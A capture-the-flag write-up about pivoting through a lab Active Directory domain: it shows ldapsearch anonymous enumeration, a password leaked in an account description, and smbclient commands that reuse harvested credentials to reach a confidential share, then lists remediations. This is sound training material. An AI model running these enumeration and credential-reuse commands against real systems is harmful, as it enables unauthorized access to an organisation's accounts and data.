# Adzogbo — AD credential pivot from anonymous LDAP to the DC

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/adzogbo-ad/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — A Samba AD domain controller allows anonymous LDAP enumeration. A
> service account leaks its password in the `description` attribute. That
> account reads a backup share whose files leak a second user's credentials,
> which open a confidential share holding the flag:
> `NCTF{4d_3…}`.


## 1. Briefing
A Samba Active Directory DC for domain `adzogbo.local`. The objective is the
flag in a confidential SMB share.

| Field | Value |
|-------|-------|
| Target | `<TARGET>` (ephemeral lab) — LDAP `:30389`, SMB `:30445` |
| Domain | `adzogbo.local` |
| Flag format | `NCTF{...}` |

## 2. Reconnaissance — anonymous LDAP enumeration

```bash
ldapsearch -x -H ldap://<TARGET>:30389 -b "CN=Users,DC=adzogbo,DC=local" \
    "(objectClass=user)" sAMAccountName description
```

The `svc-backup` account leaks its password directly in its `description`:

```
Backup service account - Temp pwd: Backup2026! (to change after migration)
```

## 3. Analysis
This is a two-hop credential-chaining problem: the DC exposes directory data
without authentication, and secrets are stored in human-readable attributes and
files rather than a vault. Each account read grants access to the next secret.

## 4. Exploitation

### Step 1 — SMB access as svc-backup

```bash
smbclient //<TARGET>/backup-reports -p 30445 -U 'ADZOGBO\svc-backup%Backup2026!' \
    -c "ls; cd onboarding; ls"
```

`onboarding/j.olympio.txt` leaks provisioned credentials:

```
username: j.olympio
password: Bl1nk182!Togo
```

### Step 2 — pivot to j.olympio, read the confidential share

```bash
smbclient //<TARGET>/confidential -p 30445 -U 'ADZOGBO\j.olympio%Bl1nk182!Togo' \
    -c "get flag.txt -"
```

## 5. Flag
```
NCTF{4d_3…}
```

## 6. Lessons & remediation
| Weakness | Root cause | Fix |
|----------|-----------|-----|
| Anonymous LDAP | DC allows unauthenticated directory reads | Restrict anonymous binds; limit attribute visibility |
| Password in `description` | Secret stored in a readable AD attribute | Never store passwords in directory attributes; rotate temp passwords immediately |
| Credential chaining | Provisioning files left on a readable share | Remove onboarding artifacts; scope share ACLs to least privilege |
